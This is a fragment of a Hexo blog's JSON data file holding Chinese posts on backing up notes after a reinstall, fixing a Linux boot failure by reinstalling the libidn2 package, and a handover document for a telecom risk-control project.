id=\"五-操作系统\"><a href=\"#五-操作系统\" class=\"headerlink\" title=\"五.操作系统\"></a>五.操作系统</h1><h1 id=\"六-计算机网络\"><a href=\"#六-计算机网络\" class=\"headerlink\" title=\"六.计算机网络\"></a>六.计算机网络</h1><h1 id=\"七-设计模式\"><a href=\"#七-设计模式\" class=\"headerlink\" title=\"七.设计模式\"></a>七.设计模式</h1><h1 id=\"八-工具\"><a href=\"#八-工具\" class=\"headerlink\" title=\"八.工具\"></a>八.工具</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"一-算法刷题\"><a href=\"#一-算法刷题\" class=\"headerlink\" title=\"一.算法刷题\"></a>一.算法刷题</h1><h1 id=\"二-Java\"><a href=\"#二-Java\" class=\"headerlink\" title=\"二.Java\"></a>二.Java</h1><ul>\n<li><p><a href=\"\">java基础</a></p>\n</li>\n<li><p><a href=\"\">集合</a></p>\n</li>\n</ul>\n<h1 id=\"三-框架\"><a href=\"#三-框架\" class=\"headerlink\" title=\"三.框架\"></a>三.框架</h1><h1 id=\"四-数据库\"><a href=\"#四-数据库\" class=\"headerlink\" title=\"四.数据库\"></a>四.数据库</h1><h1 id=\"五-操作系统\"><a href=\"#五-操作系统\" class=\"headerlink\" title=\"五.操作系统\"></a>五.操作系统</h1><h1 id=\"六-计算机网络\"><a href=\"#六-计算机网络\" class=\"headerlink\" title=\"六.计算机网络\"></a>六.计算机网络</h1><h1 id=\"七-设计模式\"><a href=\"#七-设计模式\" class=\"headerlink\" title=\"七.设计模式\"></a>七.设计模式</h1><h1 id=\"八-工具\"><a href=\"#八-工具\" class=\"headerlink\" title=\"八.工具\"></a>八.工具</h1>"},{"title":"reinstall","date":"2018-08-20T13:37:39.000Z","toc":true,"_content":"\n## 重装\n重装系统，忘了备份本地md文件。不能找回，教训深刻。\n在这记录一下解决方案，以免以后遇到。\n1. 创建git分支\n2. 将文件提交上传到分支保存\n3. git clone\n","source":"_posts/reinstall.md","raw":"---\ntitle: reinstall\ndate: 2018-08-20 09:37:39\ntags: [others]\ntoc: true\n---\n\n## 重装\n重装系统，忘了备份本地md文件。不能找回，教训深刻。\n在这记录一下解决方案，以免以后遇到。\n1. 创建git分支\n2. 将文件提交上传到分支保存\n3. git clone\n","slug":"reinstall","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321fs00026dcpdb3stqup","content":"<h2 id=\"重装\"><a href=\"#重装\" class=\"headerlink\" title=\"重装\"></a>重装</h2><p>重装系统，忘了备份本地md文件。不能找回，教训深刻。<br>在这记录一下解决方案，以免以后遇到。</p>\n<ol>\n<li>创建git分支</li>\n<li>将文件提交上传到分支保存</li>\n<li>git clone</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"重装\"><a href=\"#重装\" class=\"headerlink\" title=\"重装\"></a>重装</h2><p>重装系统，忘了备份本地md文件。不能找回，教训深刻。<br>在这记录一下解决方案，以免以后遇到。</p>\n<ol>\n<li>创建git分支</li>\n<li>将文件提交上传到分支保存</li>\n<li>git clone</li>\n</ol>\n"},{"title":"一次linux启动失败问题的解决","date":"2019-09-24T19:21:39.000Z","_content":"\n## 1.问题\n\n下载了一个截屏软件，然后提示设置了一些东西，需要重启.\n```\napt install flameshot\n```\n经试验，只这次出现了，在虚拟机中未需要设置并重启.具体原因未知.<br>\n\n然后，重启，发现启动报错，进不了桌面.<br>\n\n```\nfailed to start network manager\nfailed to start postgresql cluster 10-main\n```\n\n## 2.解决\n\n重启，进入恢复模式,找到postgres路径,并尝试手动启动，看有什么问题\n```\nfind / -name postgres\n./postgres\n```\n\n报错\n```\nrelocation error /usr/lib/x86_64-linux-gnu/libgnutls.so.30:\nsymbol _idn2_punycode_decode version IDN2_0.0.0 not defined in file libidn2.so.0 with link time reference\n```\n\n在网上找到该文件并尝试下载\n\n````\nwget http://ftp.us.debian.org/debian/pool/main/libi/libidn2/libidn2-0_2.0.5-1_amd64.deb\n```\n\n报和上面同样的错误<br>\n此时猜测 failed to start network manager 已与此问题有关.<br>\n\n重启,进入windows（双系统),下载该文件，复制到u盘<br>\n\n重启，进入恢复模式<br>\n\n查看u盘信息,并将文件得到\n```\nfdisk -l\n\n//挂载\nmount -t vfat /dev/sdb1 /media (如果fat32格式)\n//mount -t nfs /dev/sdb1 /media (如果ntfs格式)\n\n//然后拿出文件  \nmv /media/libidn2-0_2.0.5-1_amd64.deb  /root\n```\n\n安装\n```\ndpkg -i libidn2-0_2.0.5-1_amd64.deb\n```\n\n重启，成功进入桌面，问题解决.<br>\n\n\n\n总结，此问题应该不是是装flameshot导致的，而是其它某个apt update之类操作引发\n","source":"_posts/一次重启失败问题的解决.md","raw":"---\ntitle: 一次linux启动失败问题的解决\ndate: 2019-09-24 15:21:39\ntags: [others]\n---\n\n## 1.问题\n\n下载了一个截屏软件，然后提示设置了一些东西，需要重启.\n```\napt install flameshot\n```\n经试验，只这次出现了，在虚拟机中未需要设置并重启.具体原因未知.<br>\n\n然后，重启，发现启动报错，进不了桌面.<br>\n\n```\nfailed to start network manager\nfailed to start postgresql cluster 10-main\n```\n\n## 2.解决\n\n重启，进入恢复模式,找到postgres路径,并尝试手动启动，看有什么问题\n```\nfind / -name postgres\n./postgres\n```\n\n报错\n```\nrelocation error /usr/lib/x86_64-linux-gnu/libgnutls.so.30:\nsymbol _idn2_punycode_decode version IDN2_0.0.0 not defined in file libidn2.so.0 with link time reference\n```\n\n在网上找到该文件并尝试下载\n\n````\nwget http://ftp.us.debian.org/debian/pool/main/libi/libidn2/libidn2-0_2.0.5-1_amd64.deb\n```\n\n报和上面同样的错误<br>\n此时猜测 failed to start network manager 已与此问题有关.<br>\n\n重启,进入windows（双系统),下载该文件，复制到u盘<br>\n\n重启，进入恢复模式<br>\n\n查看u盘信息,并将文件得到\n```\nfdisk -l\n\n//挂载\nmount -t vfat /dev/sdb1 /media (如果fat32格式)\n//mount -t nfs /dev/sdb1 /media (如果ntfs格式)\n\n//然后拿出文件  \nmv /media/libidn2-0_2.0.5-1_amd64.deb  /root\n```\n\n安装\n```\ndpkg -i libidn2-0_2.0.5-1_amd64.deb\n```\n\n重启，成功进入桌面，问题解决.<br>\n\n\n\n总结，此问题应该不是是装flameshot导致的，而是其它某个apt update之类操作引发\n","slug":"一次重启失败问题的解决","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321fu00046dcpb99vfh8g","content":"<h2 id=\"1-问题\"><a href=\"#1-问题\" class=\"headerlink\" title=\"1.问题\"></a>1.问题</h2><p>下载了一个截屏软件，然后提示设置了一些东西，需要重启.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install flameshot</span><br></pre></td></tr></table></figure></p>\n<p>经试验，只这次出现了，在虚拟机中未需要设置并重启.具体原因未知.<br></p>\n<p>然后，重启，发现启动报错，进不了桌面.<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">failed to start network manager</span><br><span class=\"line\">failed to start postgresql cluster 10-main</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-解决\"><a href=\"#2-解决\" class=\"headerlink\" title=\"2.解决\"></a>2.解决</h2><p>重启，进入恢复模式,找到postgres路径,并尝试手动启动，看有什么问题<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -name postgres</span><br><span class=\"line\">./postgres</span><br></pre></td></tr></table></figure></p>\n<p>报错<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">relocation error /usr/lib/x86_64-linux-gnu/libgnutls.so.30:</span><br><span class=\"line\">symbol _idn2_punycode_decode version IDN2_0.0.0 not defined in file libidn2.so.0 with link time reference</span><br></pre></td></tr></table></figure></p>\n<p>在网上找到该文件并尝试下载</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://ftp.us.debian.org/debian/pool/main/libi/libidn2/libidn2-0_2.0.5-1_amd64.deb</span><br></pre></td></tr></table></figure>\n<p>报和上面同样的错误<br><br>此时猜测 failed to start network manager 已与此问题有关.<br></p>\n<p>重启,进入windows（双系统),下载该文件，复制到u盘<br></p>\n<p>重启，进入恢复模式<br></p>\n<p>查看u盘信息,并将文件得到<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fdisk -l</span><br><span class=\"line\"></span><br><span class=\"line\">//挂载</span><br><span class=\"line\">mount -t vfat /dev/sdb1 /media (如果fat32格式)</span><br><span class=\"line\">//mount -t nfs /dev/sdb1 /media (如果ntfs格式)</span><br><span class=\"line\"></span><br><span class=\"line\">//然后拿出文件  </span><br><span class=\"line\">mv /media/libidn2-0_2.0.5-1_amd64.deb  /root</span><br></pre></td></tr></table></figure></p>\n<p>安装<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpkg -i libidn2-0_2.0.5-1_amd64.deb</span><br></pre></td></tr></table></figure></p>\n<p>重启，成功进入桌面，问题解决.<br></p>\n<p>总结，此问题应该不是是装flameshot导致的，而是其它某个apt update之类操作引发</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"1-问题\"><a href=\"#1-问题\" class=\"headerlink\" title=\"1.问题\"></a>1.问题</h2><p>下载了一个截屏软件，然后提示设置了一些东西，需要重启.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install flameshot</span><br></pre></td></tr></table></figure></p>\n<p>经试验，只这次出现了，在虚拟机中未需要设置并重启.具体原因未知.<br></p>\n<p>然后，重启，发现启动报错，进不了桌面.<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">failed to start network manager</span><br><span class=\"line\">failed to start postgresql cluster 10-main</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-解决\"><a href=\"#2-解决\" class=\"headerlink\" title=\"2.解决\"></a>2.解决</h2><p>重启，进入恢复模式,找到postgres路径,并尝试手动启动，看有什么问题<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -name postgres</span><br><span class=\"line\">./postgres</span><br></pre></td></tr></table></figure></p>\n<p>报错<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">relocation error /usr/lib/x86_64-linux-gnu/libgnutls.so.30:</span><br><span class=\"line\">symbol _idn2_punycode_decode version IDN2_0.0.0 not defined in file libidn2.so.0 with link time reference</span><br></pre></td></tr></table></figure></p>\n<p>在网上找到该文件并尝试下载</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://ftp.us.debian.org/debian/pool/main/libi/libidn2/libidn2-0_2.0.5-1_amd64.deb</span><br></pre></td></tr></table></figure>\n<p>报和上面同样的错误<br><br>此时猜测 failed to start network manager 已与此问题有关.<br></p>\n<p>重启,进入windows（双系统),下载该文件，复制到u盘<br></p>\n<p>重启，进入恢复模式<br></p>\n<p>查看u盘信息,并将文件得到<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fdisk -l</span><br><span class=\"line\"></span><br><span class=\"line\">//挂载</span><br><span class=\"line\">mount -t vfat /dev/sdb1 /media (如果fat32格式)</span><br><span class=\"line\">//mount -t nfs /dev/sdb1 /media (如果ntfs格式)</span><br><span class=\"line\"></span><br><span class=\"line\">//然后拿出文件  </span><br><span class=\"line\">mv /media/libidn2-0_2.0.5-1_amd64.deb  /root</span><br></pre></td></tr></table></figure></p>\n<p>安装<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpkg -i libidn2-0_2.0.5-1_amd64.deb</span><br></pre></td></tr></table></figure></p>\n<p>重启，成功进入桌面，问题解决.<br></p>\n<p>总结，此问题应该不是是装flameshot导致的，而是其它某个apt update之类操作引发</p>\n"},{"title":"风控项目交接说明二(失信人修复)","date":"2019-09-18T20:18:34.000Z","_content":"\n现有项目地址: http://10.191.21.104:8300/unrepair/web/index\n\n## 一.整体介绍\n\n失信人修复主要分为三部分：\n\n- 修复后验证(地理位置验证)\n\n- 失信人修复\n\n- 用户与菜单管理(门户控制)\n\n## 二.具体情况\n\n### 1.地理位置验证\n\n#### 1.1 功能\n\n输入手机号和地址，查询出用户号码所在城市，用户号码所在城市，输入地址与实际居住地址距离，等几个指标信息.<br>\n\n这个没什么好说的，比较常规。\n\n![addressVerify](http://67.216.218.49:8000/file/blogs/others/address_verify_01.png)\n\n#### 1.2 注意点\n\n1.经纬度的坐标系不是同一个坐标系，需要进行转化。\n\n2.因为要调五个不同接口，最好不要串行，使用并发。因为返回值不一样，所以在控制好对应关系，处理时知道哪个结果是哪个接口的返回。\n\n```\nList<Future<Map<String,String>>> futures = new ArrayList<>();\n\nfutures.add(getAddress(jsonObject, permanentAddresss,\"permanentAddress\"));\nfutures.add(getAddress(jsonObject, cityName,\"realTimeAddress\"));\nfutures.add(getDistance2(jsonObject, workplaceVerification,\"workDistance\"));\nfutures.add(getDistance2(jsonObject, houseVerification,\"houseDistance\"));\nfutures.add(comparePosition(jsonObject, positionCompare,\"positionCompare\"));\n```\n\n### 2.失信人修复\n\n\n\n![repair](http://67.216.218.49:8000/file/blogs/others/unrepair_repairType.png)\n\n主要分为三种类型，三种类型分别有其对应的文件模板。\n\n- 核验加修复\n\n上传文件，核验，暂存或修复。\n\n- 修复\n\n上传文件，直接进行修复。\n\n- 核验\n\n上传文件，进行核验，将核验结果文件给用户，再决定是否进行修复。\n\n\n这里主要讲一下 核验和修复这两块功能的逻辑。其它的上传下载，查询预览之类的常规功能就略过了。\n\n#### 2.1 核验\n\n##### 2.1.1 流程\n\n用户根据类型，下载相应模板，然后上传需要核验的文件(只是一个文件)，后端进行简单的判断后，进行相应的数据补全， 然后调用核验接口，保存结果，并返回数据，同时生成结果文件供下载或进行下一步操作。<br>\n\n核验结果分为四种情况，一致，不一致，调用错误，不存在号码， 只有不一致才进行修复。\n\n\n##### 2.2.2 问题\n\n核验接口为单条，文件可以1000条记录，所以耗时久，改为异步线程池后，一千条记录平均从70s降到了20s,依然有点慢。<br>\n这里需要注意，不能太过增加线程池大小，一方面主机性能不一定够，另一方面，联通接口有QPS限制。\n\n##### 2.2 修复\n\n修复是电话号码和身份证不一致时，去联通，电信，或移动进行匹配，得到对应身份证下面的号码。\n\n##### 版本一\n\n\n- 单网\n\n去联通查，每个身份证可以匹配多个号码，并对结果进行排序\n\n- 三网\n\n去三网查，但是不能马上得到返回结果。需要轮询。和张硕鹏讨论后，决定采用惰性轮询\n,减少资源占用。<br>\n\n这里接口需要得入参为json格式得txt文件，所以自己生成临时文件，并在请求时按照文件类型报文，手动构造Post文件的请求体。<br>\n\n轮询得到的结果是一个外网文件地址。需要在代码中使用正向代理，获取文件，并对文件内容进行统计得到结果。\n\n##### 版本二\n\n不分为单网三网，而是分为联通，移动，电信 三种\n\n- 联通\n\n按照原先单网逻辑\n\n- 电信\n\n嵌入电信外呼页面，并提交数据\n\n- 移动\n\n嵌入移动外呼页面。并提交数据\n\n\n问题：\n\n嵌入的页面为 https, 然后所用证书多半为自己申请的免费证书，导致浏览器不信任<br>\n\n接口文档未给，处理逻辑未给, 甲方与电信移动沟通中<br>\n\n\n## 三.其它一些注意点\n\n### 1.规范\n\n方法注释，swagger等注释要完整<br>\n\n返回消息用 ResultMessage 类型进行统一包装<br>\n\n异常进行统一捕获处理,往前端抛友好提示，不抛异常 <br>\n\n计次等日志类信息，统一用切面处理，不侵入代码<br>\n\n用户管理相关功能，我们不操作门户的数据库，由门户自己进行处理，免得混杂.<br>\n\n前端输入信息，要首先进行验证，避免多余消耗资源操作与安全问题， sql语句尽量用#{} 少用 ${} 防注入。<br>\n\n多条操作，是否需要事务<br>\n\n### 2.其它一些注意点\n\n#### 2.1 缓存\n\n修复接口需要用户信息，自己生成的token,或者用户新建时保存的token和endId等信息。\n此类信息需进行全局缓存，在项目启动时生成并缓存. 同时提供惰性更新机制，当有新用户时，能自动更新添加新信息。\n\n#### 2.2 跳转\n\n原则上，后端不控制页面的跳转，但是为了解决初次登录门户在url后面加上jseesionid 导致的404问题，提供一个额外的跳转接口。\n\n#### 2.3 环境切换问题\n\n环境切换需要改两个文件，application.properties和bonc-security-base.properties\n\n#### 2.4 部署分布式\n\n部署分布式时，记得做文件共享，找丹姐\n\n#### 2.5 特殊情况\n\n如果核验过后，没有不一致的情况(即使有其它核验异常情况)， 再点修复，会返回无需要修复文件(甲方最初需求就这样)\n\n\n## 四.后期待解决问题  09-20补充\n\n### 1.对接联通页面\n\n#### 1.1 排序\n\n已交给王澍稼\n\n#### 1.2 页面跳转\n\n修复完成后，需要点击下一步跳转到联通外呼平台，进行下发。具体下发逻辑我们不管，我们进行对接，能跳转页面就行.<br>\n\n注意: 跳转页面需要自动登录，找联通要接口。需要接口文档。\n\n### 2.对接移动页面\n\n#### 2.1 https证书不安全\n\n此问题，为移动证书问题，让他们联系移动解决。\n\n#### 2.2 ip无权限\n\n不能添加白名单，需要联通的ip,去雍和宫测试.\n\n#### 2.3 页面跳转时自动登录\n\n给个能用的接口，接口文档，会不会ip没权限问题？\n\n#### 2.4 移动模板和联通模板不一致\n\n\n![cmcc_template](http://67.216.218.49:8000/file/blogs/others/unrapair_cmcc_template.png)\n\n模板中数据从哪来？授权码是啥,是否需要绑定用户?是否需要修改联通模板？需要的话，涉及到模板文件的从头捋一下。后续电信模板又不一致怎么办？\n#### 2.5 进入移动页面后，需要上传修复文件\n\n分为核验修复，和直接修复两种情况。<br>\n\n直接修复，直接自己上传文件<br>\n\n核验修复，需先核验，再上传核验过后需要修复的文件.此文件应该我们提供，给个接口，将文件处理成他们想要的格式，提供下载。(是否需要文档)\n\n### 3.对接电信页面\n\n信息不足，暂无.\n\n### 4.其它\n","source":"_posts/风控项目交接二.md","raw":"---\ntitle: 风控项目交接说明二(失信人修复)\ndate: 2019-09-18 16:18:34\ntags: [others]\n---\n\n现有项目地址: http://10.191.21.104:8300/unrepair/web/index\n\n## 一.整体介绍\n\n失信人修复主要分为三部分：\n\n- 修复后验证(地理位置验证)\n\n- 失信人修复\n\n- 用户与菜单管理(门户控制)\n\n## 二.具体情况\n\n### 1.地理位置验证\n\n#### 1.1 功能\n\n输入手机号和地址，查询出用户号码所在城市，用户号码所在城市，输入地址与实际居住地址距离，等几个指标信息.<br>\n\n这个没什么好说的，比较常规。\n\n![addressVerify](http://67.216.218.49:8000/file/blogs/others/address_verify_01.png)\n\n#### 1.2 注意点\n\n1.经纬度的坐标系不是同一个坐标系，需要进行转化。\n\n2.因为要调五个不同接口，最好不要串行，使用并发。因为返回值不一样，所以在控制好对应关系，处理时知道哪个结果是哪个接口的返回。\n\n```\nList<Future<Map<String,String>>> futures = new ArrayList<>();\n\nfutures.add(getAddress(jsonObject, permanentAddresss,\"permanentAddress\"));\nfutures.add(getAddress(jsonObject, cityName,\"realTimeAddress\"));\nfutures.add(getDistance2(jsonObject, workplaceVerification,\"workDistance\"));\nfutures.add(getDistance2(jsonObject, houseVerification,\"houseDistance\"));\nfutures.add(comparePosition(jsonObject, positionCompare,\"positionCompare\"));\n```\n\n### 2.失信人修复\n\n\n\n![repair](http://67.216.218.49:8000/file/blogs/others/unrepair_repairType.png)\n\n主要分为三种类型，三种类型分别有其对应的文件模板。\n\n- 核验加修复\n\n上传文件，核验，暂存或修复。\n\n- 修复\n\n上传文件，直接进行修复。\n\n- 核验\n\n上传文件，进行核验，将核验结果文件给用户，再决定是否进行修复。\n\n\n这里主要讲一下 核验和修复这两块功能的逻辑。其它的上传下载，查询预览之类的常规功能就略过了。\n\n#### 2.1 核验\n\n##### 2.1.1 流程\n\n用户根据类型，下载相应模板，然后上传需要核验的文件(只是一个文件)，后端进行简单的判断后，进行相应的数据补全， 然后调用核验接口，保存结果，并返回数据，同时生成结果文件供下载或进行下一步操作。<br>\n\n核验结果分为四种情况，一致，不一致，调用错误，不存在号码， 只有不一致才进行修复。\n\n\n##### 2.2.2 问题\n\n核验接口为单条，文件可以1000条记录，所以耗时久，改为异步线程池后，一千条记录平均从70s降到了20s,依然有点慢。<br>\n这里需要注意，不能太过增加线程池大小，一方面主机性能不一定够，另一方面，联通接口有QPS限制。\n\n##### 2.2 修复\n\n修复是电话号码和身份证不一致时，去联通，电信，或移动进行匹配，得到对应身份证下面的号码。\n\n##### 版本一\n\n\n- 单网\n\n去联通查，每个身份证可以匹配多个号码，并对结果进行排序\n\n- 三网\n\n去三网查，但是不能马上得到返回结果。需要轮询。和张硕鹏讨论后，决定采用惰性轮询\n,减少资源占用。<br>\n\n这里接口需要得入参为json格式得txt文件，所以自己生成临时文件，并在请求时按照文件类型报文，手动构造Post文件的请求体。<br>\n\n轮询得到的结果是一个外网文件地址。需要在代码中使用正向代理，获取文件，并对文件内容进行统计得到结果。\n\n##### 版本二\n\n不分为单网三网，而是分为联通，移动，电信 三种\n\n- 联通\n\n按照原先单网逻辑\n\n- 电信\n\n嵌入电信外呼页面，并提交数据\n\n- 移动\n\n嵌入移动外呼页面。并提交数据\n\n\n问题：\n\n嵌入的页面为 https, 然后所用证书多半为自己申请的免费证书，导致浏览器不信任<br>\n\n接口文档未给，处理逻辑未给, 甲方与电信移动沟通中<br>\n\n\n## 三.其它一些注意点\n\n### 1.规范\n\n方法注释，swagger等注释要完整<br>\n\n返回消息用 ResultMessage 类型进行统一包装<br>\n\n异常进行统一捕获处理,往前端抛友好提示，不抛异常 <br>\n\n计次等日志类信息，统一用切面处理，不侵入代码<br>\n\n用户管理相关功能，我们不操作门户的数据库，由门户自己进行处理，免得混杂.<br>\n\n前端输入信息，要首先进行验证，避免多余消耗资源操作与安全问题， sql语句尽量用#{} 少用 ${} 防注入。<br>\n\n多条操作，是否需要事务<br>\n\n### 2.其它一些注意点\n\n#### 2.1 缓存\n\n修复接口需要用户信息，自己生成的token,或者用户新建时保存的token和endId等信息。\n此类信息需进行全局缓存，在项目启动时生成并缓存. 同时提供惰性更新机制，当有新用户时，能自动更新添加新信息。\n\n#### 2.2 跳转\n\n原则上，后端不控制页面的跳转，但是为了解决初次登录门户在url后面加上jseesionid 导致的404问题，提供一个额外的跳转接口。\n\n#### 2.3 环境切换问题\n\n环境切换需要改两个文件，application.properties和bonc-security-base.properties\n\n#### 2.4 部署分布式\n\n部署分布式时，记得做文件共享，找丹姐\n\n#### 2.5 特殊情况\n\n如果核验过后，没有不一致的情况(即使有其它核验异常情况)， 再点修复，会返回无需要修复文件(甲方最初需求就这样)\n\n\n## 四.后期待解决问题  09-20补充\n\n### 1.对接联通页面\n\n#### 1.1 排序\n\n已交给王澍稼\n\n#### 1.2 页面跳转\n\n修复完成后，需要点击下一步跳转到联通外呼平台，进行下发。具体下发逻辑我们不管，我们进行对接，能跳转页面就行.<br>\n\n注意: 跳转页面需要自动登录，找联通要接口。需要接口文档。\n\n### 2.对接移动页面\n\n#### 2.1 https证书不安全\n\n此问题，为移动证书问题，让他们联系移动解决。\n\n#### 2.2 ip无权限\n\n不能添加白名单，需要联通的ip,去雍和宫测试.\n\n#### 2.3 页面跳转时自动登录\n\n给个能用的接口，接口文档，会不会ip没权限问题？\n\n#### 2.4 移动模板和联通模板不一致\n\n\n![cmcc_template](http://67.216.218.49:8000/file/blogs/others/unrapair_cmcc_template.png)\n\n模板中数据从哪来？授权码是啥,是否需要绑定用户?是否需要修改联通模板？需要的话，涉及到模板文件的从头捋一下。后续电信模板又不一致怎么办？\n#### 2.5 进入移动页面后，需要上传修复文件\n\n分为核验修复，和直接修复两种情况。<br>\n\n直接修复，直接自己上传文件<br>\n\n核验修复，需先核验，再上传核验过后需要修复的文件.此文件应该我们提供，给个接口，将文件处理成他们想要的格式，提供下载。(是否需要文档)\n\n### 3.对接电信页面\n\n信息不足，暂无.\n\n### 4.其它\n","slug":"风控项目交接二","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321fv00056dcpgrndw887","content":"<p>现有项目地址: <a href=\"http://10.191.21.104:8300/unrepair/web/index\" target=\"_blank\" rel=\"noopener\">http://10.191.21.104:8300/unrepair/web/index</a></p>\n<h2 id=\"一-整体介绍\"><a href=\"#一-整体介绍\" class=\"headerlink\" title=\"一.整体介绍\"></a>一.整体介绍</h2><p>失信人修复主要分为三部分：</p>\n<ul>\n<li><p>修复后验证(地理位置验证)</p>\n</li>\n<li><p>失信人修复</p>\n</li>\n<li><p>用户与菜单管理(门户控制)</p>\n</li>\n</ul>\n<h2 id=\"二-具体情况\"><a href=\"#二-具体情况\" class=\"headerlink\" title=\"二.具体情况\"></a>二.具体情况</h2><h3 id=\"1-地理位置验证\"><a href=\"#1-地理位置验证\" class=\"headerlink\" title=\"1.地理位置验证\"></a>1.地理位置验证</h3><h4 id=\"1-1-功能\"><a href=\"#1-1-功能\" class=\"headerlink\" title=\"1.1 功能\"></a>1.1 功能</h4><p>输入手机号和地址，查询出用户号码所在城市，用户号码所在城市，输入地址与实际居住地址距离，等几个指标信息.<br></p>\n<p>这个没什么好说的，比较常规。</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/others/address_verify_01.png\" alt=\"addressVerify\"></p>\n<h4 id=\"1-2-注意点\"><a href=\"#1-2-注意点\" class=\"headerlink\" title=\"1.2 注意点\"></a>1.2 注意点</h4><p>1.经纬度的坐标系不是同一个坐标系，需要进行转化。</p>\n<p>2.因为要调五个不同接口，最好不要串行，使用并发。因为返回值不一样，所以在控制好对应关系，处理时知道哪个结果是哪个接口的返回。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">List&lt;Future&lt;Map&lt;String,String&gt;&gt;&gt; futures = new ArrayList&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">futures.add(getAddress(jsonObject, permanentAddresss,&quot;permanentAddress&quot;));</span><br><span class=\"line\">futures.add(getAddress(jsonObject, cityName,&quot;realTimeAddress&quot;));</span><br><span class=\"line\">futures.add(getDistance2(jsonObject, workplaceVerification,&quot;workDistance&quot;));</span><br><span class=\"line\">futures.add(getDistance2(jsonObject, houseVerification,&quot;houseDistance&quot;));</span><br><span class=\"line\">futures.add(comparePosition(jsonObject, positionCompare,&quot;positionCompare&quot;));</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-失信人修复\"><a href=\"#2-失信人修复\" class=\"headerlink\" title=\"2.失信人修复\"></a>2.失信人修复</h3><p><img src=\"http://67.216.218.49:8000/file/blogs/others/unrepair_repairType.png\" alt=\"repair\"></p>\n<p>主要分为三种类型，三种类型分别有其对应的文件模板。</p>\n<ul>\n<li>核验加修复</li>\n</ul>\n<p>上传文件，核验，暂存或修复。</p>\n<ul>\n<li>修复</li>\n</ul>\n<p>上传文件，直接进行修复。</p>\n<ul>\n<li>核验</li>\n</ul>\n<p>上传文件，进行核验，将核验结果文件给用户，再决定是否进行修复。</p>\n<p>这里主要讲一下 核验和修复这两块功能的逻辑。其它的上传下载，查询预览之类的常规功能就略过了。</p>\n<h4 id=\"2-1-核验\"><a href=\"#2-1-核验\" class=\"headerlink\" title=\"2.1 核验\"></a>2.1 核验</h4><h5 id=\"2-1-1-流程\"><a href=\"#2-1-1-流程\" class=\"headerlink\" title=\"2.1.1 流程\"></a>2.1.1 流程</h5><p>用户根据类型，下载相应模板，然后上传需要核验的文件(只是一个文件)，后端进行简单的判断后，进行相应的数据补全， 然后调用核验接口，保存结果，并返回数据，同时生成结果文件供下载或进行下一步操作。<br></p>\n<p>核验结果分为四种情况，一致，不一致，调用错误，不存在号码， 只有不一致才进行修复。</p>\n<h5 id=\"2-2-2-问题\"><a href=\"#2-2-2-问题\" class=\"headerlink\" title=\"2.2.2 问题\"></a>2.2.2 问题</h5><p>核验接口为单条，文件可以1000条记录，所以耗时久，改为异步线程池后，一千条记录平均从70s降到了20s,依然有点慢。<br><br>这里需要注意，不能太过增加线程池大小，一方面主机性能不一定够，另一方面，联通接口有QPS限制。</p>\n<h5 id=\"2-2-修复\"><a href=\"#2-2-修复\" 